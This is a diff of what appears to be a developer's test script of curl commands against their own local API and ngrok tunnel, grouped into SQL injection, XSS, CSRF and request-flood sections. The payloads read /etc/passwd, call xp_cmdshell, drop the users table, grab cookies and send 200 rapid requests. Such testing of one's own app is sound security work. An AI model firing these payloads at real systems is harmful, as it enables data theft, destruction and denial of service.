@@ -1,256 +1,256 @@
 
 ########################################### SQLi ############################################
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1%20UNION%20SELECT%201,2,3&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1%20UNION%20SELECT%201,2,3&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1%20INTO%20OUTFILE%20'/tmp/test.txt'&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1%20INTO%20OUTFILE%20'/tmp/test.txt'&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1%20AND%20LOAD_FILE('/etc/passwd')&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1%20AND%20LOAD_FILE('/etc/passwd')&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1;%20SELECT%20pg_read_file('/etc/passwd');&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1;%20SELECT%20pg_read_file('/etc/passwd');&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1;%20EXEC%20xp_cmdshell('dir');&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1;%20EXEC%20xp_cmdshell('dir');&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1;%20SELECT%20SLEEP(5);&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1;%20SELECT%20SLEEP(5);&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1%20AND%20BENCHMARK(1000000,MD5(1))&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1%20AND%20BENCHMARK(1000000,MD5(1))&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1%20AND%20updatexml(1,concat(0x7e,(SELECT%20database())),1)&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1%20AND%20updatexml(1,concat(0x7e,(SELECT%20database())),1)&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1%20AND%20CONVERT(int,%20'abc')&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1%20AND%20CONVERT(int,%20'abc')&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1;%20SELECT%201;&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1;%20SELECT%201;&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1;%20DROP%20TABLE%20users;&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1;%20DROP%20TABLE%20users;&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1%20OR%201=1&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1%20OR%201=1&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=' OR 'a'='a' -- &password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=' OR 'a'='a' -- &password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1%20AND%20(SELECT%20table_name%20FROM%20information_schema.tables)&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1%20AND%20(SELECT%20table_name%20FROM%20information_schema.tables)&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1;%20SELECT%20*%20FROM%20sys.tables;&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1;%20SELECT%20*%20FROM%20sys.tables;&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=1'%20AND%20sqlmap='test&password=x"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=1'%20AND%20sqlmap='test&password=x"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=nmap%20-p%2080%20localhost&password=x"
-
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 UNION SELECT 1,2,3\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 INTO OUTFILE '/tmp/test.txt'\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND LOAD_FILE('/etc/passwd')\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT pg_read_file('/etc/passwd');\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; EXEC xp_cmdshell('dir');\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT SLEEP(5);\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND BENCHMARK(1000000,MD5(1))\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND updatexml(1,concat(0x7e,(SELECT database())),1)\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND CONVERT(int, 'abc')\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT 1;\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; DROP TABLE users;\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 OR 1=1\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"' OR 'a'='a' -- \",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND (SELECT table_name FROM information_schema.tables)\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT * FROM sys.tables;\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1' AND sqlmap='test\",\"password\":\"x\"}"
-
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"nmap -p 80 localhost\",\"password\":\"x\"}"
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=nmap%20-p%2080%20localhost&password=x"
 
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 UNION SELECT 1,2,3\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 UNION SELECT 1,2,3\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 INTO OUTFILE '/tmp/test.txt'\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 INTO OUTFILE '/tmp/test.txt'\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND LOAD_FILE('/etc/passwd')\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND LOAD_FILE('/etc/passwd')\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT pg_read_file('/etc/passwd');\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT pg_read_file('/etc/passwd');\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; EXEC xp_cmdshell('dir');\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; EXEC xp_cmdshell('dir');\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT SLEEP(5);\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT SLEEP(5);\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND BENCHMARK(1000000,MD5(1))\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND BENCHMARK(1000000,MD5(1))\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND updatexml(1,concat(0x7e,(SELECT database())),1)\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND updatexml(1,concat(0x7e,(SELECT database())),1)\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND CONVERT(int, 'abc')\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND CONVERT(int, 'abc')\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT 1;\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT 1;\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; DROP TABLE users;\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; DROP TABLE users;\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 OR 1=1\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 OR 1=1\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"' OR 'a'='a' -- \",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"' OR 'a'='a' -- \",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND (SELECT table_name FROM information_schema.tables)\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND (SELECT table_name FROM information_schema.tables)\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT * FROM sys.tables;\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT * FROM sys.tables;\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1' AND sqlmap='test\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1' AND sqlmap='test\",\"password\":\"x\"}"
 
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"nmap -p 80 localhost\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"nmap -p 80 localhost\",\"password\":\"x\"}"
 
-curl "https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/search/?id=1 UNION SELECT * FROM users --"
 
-curl -X POST https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/login/ -d "username=admin' OR 1=1 --&password=test"
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 UNION SELECT 1,2,3\",\"password\":\"x\"}"
 
-curl -X PUT https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/profile/ -d "email=test' UNION SELECT password FROM users --" -H "Content-Type: application/x-www-form-urlencoded"
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 INTO OUTFILE '/tmp/test.txt'\",\"password\":\"x\"}"
 
-curl -X PATCH https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/profile/ -d '{"username":"admin'; DROP TABLE users; --"}' -H "Content-Type: application/json"ç
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND LOAD_FILE('/etc/passwd')\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT pg_read_file('/etc/passwd');\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; EXEC xp_cmdshell('dir');\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT SLEEP(5);\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND BENCHMARK(1000000,MD5(1))\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND updatexml(1,concat(0x7e,(SELECT database())),1)\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND CONVERT(int, 'abc')\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT 1;\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; DROP TABLE users;\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 OR 1=1\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"' OR 'a'='a' -- \",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1 AND (SELECT table_name FROM information_schema.tables)\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1; SELECT * FROM sys.tables;\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"1' AND sqlmap='test\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"nmap -p 80 localhost\",\"password\":\"x\"}"
+
+
+
+curl "https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/search/?id=1 UNION SELECT * FROM users --"
+
+curl -X POST https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/login/ -d "user=admin' OR 1=1 --&password=test"
+
+curl -X PUT https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/profile/ -d "email=test' UNION SELECT password FROM users --" -H "Content-Type: application/x-www-form-urlencoded"
+
+curl -X PATCH https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/profile/ -d '{"user":"admin'; DROP TABLE users; --"}' -H "Content-Type: application/json"ç
 
 
 ########################################### XSS #############################################
 
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<script^>alert(1)^</script^>\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<script^>alert(1)^</script^>\",\"password\":\"x\"}"
 
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^< s c r i p t ^>alert(1)^</script^>\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^< s c r i p t ^>alert(1)^</script^>\",\"password\":\"x\"}"
 
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<a href='javascript:alert(1)'^>click^</a^>\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<a href='javascript:alert(1)'^>click^</a^>\",\"password\":\"x\"}"
 
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<img src=x onerror=alert(1)^>\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<img src=x onerror=alert(1)^>\",\"password\":\"x\"}"
 
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='^></object^>\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='^></object^>\",\"password\":\"x\"}"
 
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<body onpageshow=alert(1)^>\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<body onpageshow=alert(1)^>\",\"password\":\"x\"}"
 
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<img src='x' onerror='x=document.cookie'^>\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<img src='x' onerror='x=document.cookie'^>\",\"password\":\"x\"}"
 
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user%3Cscript%3Ealert(1)%3C/script%3E\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user%3Cscript%3Ealert(1)%3C/script%3E\",\"password\":\"x\"}"
 
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<svg onload=alert(1)^></svg^>\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<svg onload=alert(1)^></svg^>\",\"password\":\"x\"}"
 
-curl -X POST http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<img src='javascript:alert(1)'^>\",\"password\":\"x\"}"
+curl -X POST http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<img src='javascript:alert(1)'^>\",\"password\":\"x\"}"
+
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=user^<script^>alert(1)^</script^>&password=x"
+
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=user^<script^>alert(1)^</script^>&password=x"
+
+curl -X GET "http://192.168.1.6:8000/api/login/?correo=user%3Cscript%3Ealert(1)%3C/script%3E&password=x"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<script^>alert(1)^</script^>\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^< s c r i p t ^>alert(1)^</script^>\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<a href='javascript:alert(1)'^>click^</a^>\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<img src=x onerror=alert(1)^>\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='^></object^>\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<body onpageshow=alert(1)^>\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<img src='x' onerror='x=document.cookie'^>\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user%3Cscript%3Ealert(1)%3C/script%3E\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<svg onload=alert(1)^></svg^>\",\"password\":\"x\"}"
+
+curl -X PUT http://192.168.1.6:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<img src='javascript:alert(1)'^>\",\"password\":\"x\"}"
 
 
+curl "https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/search/?q=<script>alert(1)</script>"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=user^<script^>alert(1)^</script^>&password=x"
+curl -X POST https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/login/ -d "username=test&password=<img src=x onerror=alert(1)>"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=user^<script^>alert(1)^</script^>&password=x"
+curl -X PUT https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/profile/ -d "name=test&bio=javascript:alert(1)" -H "Content-Type: application/x-www-form-urlencoded"
 
-curl -X GET "http://192.168.0.5:8000/api/login/?correo=user%3Cscript%3Ealert(1)%3C/script%3E&password=x"
-
-
-
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<script^>alert(1)^</script^>\",\"password\":\"x\"}"
-
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^< s c r i p t ^>alert(1)^</script^>\",\"password\":\"x\"}"
-
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<a href='javascript:alert(1)'^>click^</a^>\",\"password\":\"x\"}"
-
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<img src=x onerror=alert(1)^>\",\"password\":\"x\"}"
-
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='^></object^>\",\"password\":\"x\"}"
-
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<body onpageshow=alert(1)^>\",\"password\":\"x\"}"
-
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<img src='x' onerror='x=document.cookie'^>\",\"password\":\"x\"}"
-
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user%3Cscript%3Ealert(1)%3C/script%3E\",\"password\":\"x\"}"
-
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<svg onload=alert(1)^></svg^>\",\"password\":\"x\"}"
-
-curl -X PUT http://192.168.0.5:8000/api/login/ -H "Content-Type: application/json" -d "{\"correo\":\"user^<img src='javascript:alert(1)'^>\",\"password\":\"x\"}"
-
-curl "https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/search/?q=<script>alert(1)</script>"
-
-curl -X POST https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/login/ -d "username=test&password=<img src=x onerror=alert(1)>"
-
-curl -X PUT https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/profile/ -d "name=test&bio=javascript:alert(1)" -H "Content-Type: application/x-www-form-urlencoded"
-
-curl -X PATCH https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/profile/ -d '{"bio":"<svg onload=alert(1)>"}' -H "Content-Type: application/json"
+curl -X PATCH https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/profile/ -d '{"bio":"<svg onload=alert(1)>"}' -H "Content-Type: application/json"
 
 ########################################### CSRF #############################################
 
-curl -X GET "http://192.168.0.5:8000/test-path?password=secret123&action=login" -H "Origin: http://evil.com"
+curl -X GET "http://192.168.1.6:8000/test-path?password=secret123&action=login" -H "Origin: http://evil.com"
 
-curl -X GET "http://192.168.0.5:8000/test-path?transfer=999&amount=500" -H "Referer: http://evil.com"
+curl -X GET "http://192.168.1.6:8000/test-path?transfer=999&amount=500" -H "Referer: http://evil.com"
 
-curl -X GET "http://192.168.0.5:8000/test-path?email=user@evil.com&username=admin"
+curl -X GET "http://192.168.1.6:8000/test-path?email=user@evil.com&username=admin"
 
-curl -X PUT http://192.168.0.5:8000/test-path -d "update=malicious_data&token=fake" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://evil.com"
+curl -X PUT http://192.168.1.6:8000/test-path -d "update=malicious_data&token=fake" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://evil.com"
 
-curl -X PUT http://192.168.0.5:8000/test-path -d '{"amount":1000,"token":"stolen"}' -H "Content-Type: application/json" -H "Referer: http://evil.com"
+curl -X PUT http://192.168.1.6:8000/test-path -d '{"amount":1000,"token":"stolen"}' -H "Content-Type: application/json" -H "Referer: http://evil.com"
 
-curl -X PUT "http://192.168.0.5:8000/test-path?delete=id456" -d "update=overwrite" -H "Content-Type: application/x-www-form-urlencoded"
+curl -X PUT "http://192.168.1.6:8000/test-path?delete=id456" -d "update=overwrite" -H "Content-Type: application/x-www-form-urlencoded"
 
-curl -X POST http://192.168.0.5:8000/test-path -d "param=evil_value" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://evil.com"
+curl -X POST http://192.168.1.6:8000/test-path -d "param=evil_value" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://evil.com"
 
-curl -X POST http://192.168.0.5:8000/test-path -d '{"amount":200,"token":"fake123"}' -H "Content-Type: application/json" -H "Referer: http://evil.com"
+curl -X POST http://192.168.1.6:8000/test-path -d '{"amount":200,"token":"fake123"}' -H "Content-Type: application/json" -H "Referer: http://evil.com"
 
-curl -X POST http://192.168.0.5:8000/test-path -d "csrfmiddlewaretoken=INVALID&password=12345" -H "Content-Type: application/x-www-form-urlencoded"
-
-
+curl -X POST http://192.168.1.6:8000/test-path -d "csrfmiddlewaretoken=INVALID&password=12345" -H "Content-Type: application/x-www-form-urlencoded"
 
 
-curl -X POST https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/login/ -d "username=test&password=pass" -H "Referer: https://evil-site.com"
 
-curl -X PUT https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/profile/ -d "name=test" -H "Origin: https://malicious.com" -H "Referer: https://malicious.com"
 
-curl -X PATCH https://3bd9-2800-320-c8b4-7a00-5ca2-3427-eee3-f068.ngrok-free.app/api/profile/ -H "Content-Type: application/json" -d '{"email":"test@evil.com"}' -H "Origin: https://bad-origin.com"
+curl -X POST https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/login/ -d "username=test&password=pass" -H "Referer: https://evil-site.com"
+
+curl -X PUT https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/profile/ -d "name=test" -H "Origin: https://malicious.com" -H "Referer: https://malicious.com"
+
+curl -X PATCH https://pseudocourteous-jasperated-shavonne.ngrok-free.dev/api/profile/ -H "Content-Type: application/json" -d '{"email":"test@evil.com"}' -H "Origin: https://bad-origin.com"
 
 
 ########################################### DoS/Scraping avanzado #############################################
 
-for /L %i in (1,1,200) do curl -s -o nul -w "%{http_code}\n" -X GET http://192.168.0.5:8000/api/login/
+for /L %i in (1,1,200) do curl -s -o nul -w "%{http_code}\n" -X GET http://192.168.1.6:8000/api/login/
 
-for /L %%i in (1,1,200) do curl -s -o nul -w "%%{http_code}\n" -X GET http://192.168.0.5:8000/api/login/
+for /L %%i in (1,1,200) do curl -s -o nul -w "%%{http_code}\n" -X GET http://192.168.1.6:8000/api/login/
 
